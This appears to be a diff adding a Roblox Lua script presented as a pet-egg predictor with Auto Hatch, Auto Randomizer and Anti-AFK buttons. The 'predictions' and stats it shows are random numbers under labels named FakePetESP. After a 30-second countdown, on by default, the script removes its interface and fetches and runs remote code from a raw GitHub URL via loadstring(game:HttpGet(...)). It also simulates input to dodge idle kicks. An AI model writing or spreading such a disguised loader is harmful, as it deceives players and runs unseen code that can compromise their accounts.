@@ -1,1 +1,266 @@
+local players = game:GetService("Players")
+local collectionService = game:GetService("CollectionService")
+local localPlayer = players.LocalPlayer
 
+local eggChances = {
+    ["Common Egg"] = {["Dog"] = 33, ["Bunny"] = 33, ["Golden Lab"] = 33},
+    ["Uncommon Egg"] = {["Black Bunny"] = 25, ["Chicken"] = 25, ["Cat"] = 25, ["Deer"] = 25},
+    ["Rare Egg"] = {["Orange Tabby"] = 33.33, ["Spotted Deer"] = 25, ["Pig"] = 16.67, ["Rooster"] = 16.67, ["Monkey"] = 8.33},
+    ["Legendary Egg"] = {["Cow"] = 42.55, ["Silver Monkey"] = 42.55, ["Sea Otter"] = 10.64, ["Turtle"] = 2.13, ["Polar Bear"] = 2.13},
+    ["Mythical Egg"] = {["Grey Mouse"] = 37.5, ["Brown Mouse"] = 26.79, ["Squirrel"] = 26.79, ["Red Giant Ant"] = 8.93, ["Red Fox"] = 0},
+    ["Bug Egg"] = {["Snail"] = 40, ["Giant Ant"] = 35, ["Caterpillar"] = 25, ["Praying Mantis"] = 0, ["Dragon Fly"] = 0},
+    ["Night Egg"] = {["Hedgehog"] = 47, ["Mole"] = 23.5, ["Frog"] = 21.16, ["Echo Frog"] = 8.35, ["Night Owl"] = 0, ["Raccoon"] = 0},
+    ["Bee Egg"] = {["Bee"] = 65, ["Honey Bee"] = 20, ["Bear Bee"] = 10, ["Petal Bee"] = 5, ["Queen Bee"] = 0},
+    ["Anti Bee Egg"] = {["Wasp"] = 55, ["Tarantula Hawk"] = 31, ["Moth"] = 14, ["Butterfly"] = 0, ["Disco Bee"] = 0},
+    ["Common Summer Egg"] = {["Starfish"] = 50, ["Seafull"] = 25, ["Crab"] = 25},
+    ["Rare Summer Egg"] = {["Flamingo"] = 30, ["Toucan"] = 25, ["Sea Turtle"] = 20, ["Orangutan"] = 15, ["Seal"] = 10},
+    ["Paradise Egg"] = {["Ostrich"] = 43, ["Peacock"] = 33, ["Capybara"] = 24, ["Scarlet Macaw"] = 0, ["Mimic Octopus"] = 0},
+    ["Premium Night Egg"] = {["Hedgehog"] = 50, ["Mole"] = 26, ["Frog"] = 14, ["Echo Frog"] = 10}
+}
+
+local realESP = {
+    ["Common Egg"] = true, ["Uncommon Egg"] = true, ["Rare Egg"] = true,
+    ["Common Summer Egg"] = true, ["Rare Summer Egg"] = true
+}
+
+local displayedEggs = {}
+local autoRunning = true
+local autoStopOn = true
+
+local function weightedRandom(options)
+    local valid = {}
+    for pet, chance in pairs(options) do
+        if chance > 0 then table.insert(valid, {pet = pet, chance = chance}) end
+    end
+    if #valid == 0 then return nil end
+    local total = 0
+    for _, v in ipairs(valid) do total += v.chance end
+    local roll = math.random() * total
+    local cumulative = 0
+    for _, v in ipairs(valid) do
+        cumulative += v.chance
+        if roll <= cumulative then return v.pet end
+    end
+    return valid[1].pet
+end
+
+local function getNonRepeatingRandomPet(eggName, lastPet)
+    local pool = eggChances[eggName]
+    if not pool then return nil end
+    local tries = 0
+    local selectedPet = lastPet
+    while tries < 5 do
+        local pet = weightedRandom(pool)
+        if not pet then return nil end
+        if pet ~= lastPet or math.random() < 0.3 then
+            selectedPet = pet
+            break
+        end
+        tries += 1
+    end
+    return selectedPet
+end
+
+local function createEspGui(object, labelText)
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "FakePetESP"
+    billboard.Adornee = object:FindFirstChildWhichIsA("BasePart") or object.PrimaryPart or object
+    billboard.Size = UDim2.new(0, 200, 0, 60)
+    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
+    billboard.AlwaysOnTop = true
+
+    local label = Instance.new("TextLabel")
+    label.Name = "PetName"
+    label.Size = UDim2.new(1, 0, 0.5, 0)
+    label.Position = UDim2.new(0, 0, 0, 0)
+    label.BackgroundTransparency = 1
+    label.TextColor3 = Color3.new(1, 1, 1)
+    label.TextStrokeTransparency = 0
+    label.TextScaled = true
+    label.Font = Enum.Font.SourceSansBold
+    label.Text = labelText
+    label.Parent = billboard
+
+    local statsLabel = Instance.new("TextLabel")
+    statsLabel.Name = "FakeStats"
+    statsLabel.Size = UDim2.new(1, 0, 0.5, 0)
+    statsLabel.Position = UDim2.new(0, 0, 0.5, 0)
+    statsLabel.BackgroundTransparency = 1
+    statsLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    statsLabel.TextScaled = true
+    statsLabel.Font = Enum.Font.SourceSans
+    statsLabel.TextStrokeTransparency = 0.5
+
+    local rng = math.random(1, 100)
+    local weight, age
+    if rng <= 85 then
+        weight = math.random(8, 14)
+        age = math.random(35, 50)
+    else
+        weight = math.random(15, 40)
+        age = math.random(20, 45)
+    end
+    statsLabel.Text = tostring(weight) .. "kg | Predict: Age " .. tostring(age)
+    statsLabel.Parent = billboard
+
+    billboard.Parent = object
+    return billboard
+end
+
+local function addESP(egg)
+    if egg:GetAttribute("OWNER") ~= localPlayer.Name then return end
+    local eggName = egg:GetAttribute("EggName")
+    local objectId = egg:GetAttribute("OBJECT_UUID")
+    if not eggName or not objectId or displayedEggs[objectId] then return end
+
+    local labelText, firstPet
+    if realESP[eggName] then
+        labelText = eggName
+    else
+        firstPet = getNonRepeatingRandomPet(eggName, nil)
+        labelText = eggName .. " | " .. (firstPet or "?")
+    end
+
+    local espGui = createEspGui(egg, labelText)
+    displayedEggs[objectId] = {
+        egg = egg,
+        gui = espGui,
+        label = espGui:FindFirstChild("PetName"),
+        eggName = eggName,
+        lastPet = firstPet
+    }
+end
+
+local function removeESP(egg)
+    local objectId = egg:GetAttribute("OBJECT_UUID")
+    if objectId and displayedEggs[objectId] then
+        displayedEggs[objectId].gui:Destroy()
+        displayedEggs[objectId] = nil
+    end
+end
+
+for _, egg in collectionService:GetTagged("PetEggServer") do
+    addESP(egg)
+end
+
+collectionService:GetInstanceAddedSignal("PetEggServer"):Connect(addESP)
+collectionService:GetInstanceRemovedSignal("PetEggServer"):Connect(removeESP)
+
+-- GUI Setup
+local gui = Instance.new("ScreenGui", localPlayer:WaitForChild("PlayerGui"))
+gui.Name = "RandomizerGUI"
+gui.ResetOnSpawn = false
+
+-- Auto Stop Button
+local stopBtn = Instance.new("TextButton", gui)
+stopBtn.Size = UDim2.new(0, 150, 0, 40)
+stopBtn.Position = UDim2.new(1, -190, 0, 0)
+stopBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+stopBtn.TextColor3 = Color3.new(1, 1, 1)
+stopBtn.Text = "🛑 Auto Hatch: ON"
+stopBtn.TextScaled = true
+
+stopBtn.MouseButton1Click:Connect(function()
+    autoStopOn = not autoStopOn
+    stopBtn.Text = autoStopOn and "🛑 Auto Hatch: ON" or "🛑 Auto Hatch: OFF"
+end)
+
+-- Info Button
+local info = Instance.new("TextButton", gui)
+info.Size = UDim2.new(0, 30, 0, 40)
+info.Position = UDim2.new(1, -35, 0, 0)
+info.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
+info.TextColor3 = Color3.new(1, 1, 1)
+info.Text = "?"
+info.TextScaled = true
+
+info.MouseButton1Click:Connect(function()
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Info",
+        Text = "Auto Hatch; Raccoon, Dragonfly, Queen Bee, Red Fox, Disco bee and Butterfly.",
+        Duration = 5
+    })
+end)
+
+-- Auto Randomizer Button
+local autoBtn = Instance.new("TextButton", gui)
+autoBtn.Size = UDim2.new(0, 150, 0, 40)
+autoBtn.Position = UDim2.new(1, -190, 0, 45)
+autoBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+autoBtn.TextColor3 = Color3.new(1, 1, 1)
+autoBtn.Text = "🟢 Auto Randomizer: ON"
+autoBtn.TextScaled = true
+
+-- Countdown
+local timer = Instance.new("TextLabel", gui)
+timer.Size = UDim2.new(0, 150, 0, 30)
+timer.Position = UDim2.new(1, -190, 0, 90)
+timer.BackgroundTransparency = 1
+timer.TextColor3 = Color3.fromRGB(200, 200, 200)
+timer.Text = ""
+timer.TextScaled = true
+timer.Visible = false
+
+-- Anti-AFK Toggle Button
+local afkEnabled = true
+
+local afkBtn = Instance.new("TextButton", gui)
+afkBtn.Size = UDim2.new(0, 150, 0, 40)
+afkBtn.Position = UDim2.new(1, -190, 0, 135)
+afkBtn.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+afkBtn.TextColor3 = Color3.new(1, 1, 1)
+afkBtn.Text = "✅ Anti-AFK: ON"
+afkBtn.TextScaled = true
+
+afkBtn.MouseButton1Click:Connect(function()
+    afkEnabled = not afkEnabled
+    afkBtn.Text = afkEnabled and "✅ Anti-AFK: ON" or "❌ Anti-AFK: OFF"
+end)
+
+-- Auto Randomizer Countdown
+coroutine.wrap(function()
+    while true do
+        if autoRunning then
+            timer.Visible = true
+            for i = 30, 1, -1 do
+                if not autoRunning then
+                    timer.Text = ""
+                    timer.Visible = false
+                    break
+                end
+                timer.Text = "Changing in: " .. i
+                wait(1)
+            end
+            if autoRunning then
+                gui:Destroy()
+                for _, obj in pairs(workspace:GetDescendants()) do
+                    if obj:IsA("BillboardGui") and obj.Name == "FakePetESP" then
+                        obj:Destroy()
+                    end
+                end
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/MaximumRXDM/itlogesp/refs/heads/main/Betlogan"))()
+                break
+            end
+        else
+            wait(1)
+        end
+    end
+end)()
+
+autoBtn.MouseButton1Click:Connect(function()
+    autoRunning = not autoRunning
+    autoBtn.Text = autoRunning and "🟢 Auto Randomizer: ON" or "🔴 Auto Randomizer: OFF"
+    timer.Visible = autoRunning
+end)
+
+-- Anti-AFK
+local vu = game:GetService("VirtualUser")
+local cam = workspace.CurrentCamera
+
+players.LocalPlayer.Idled:Connect(function()
+    if afkEnabled then
+        vu:Button2Down(Vector2.new(0, 0), cam.CFrame)
+        task.wait(1)
+        vu:Button2Up(Vector2.new(0, 0), cam.CFrame)
+    end
+end)
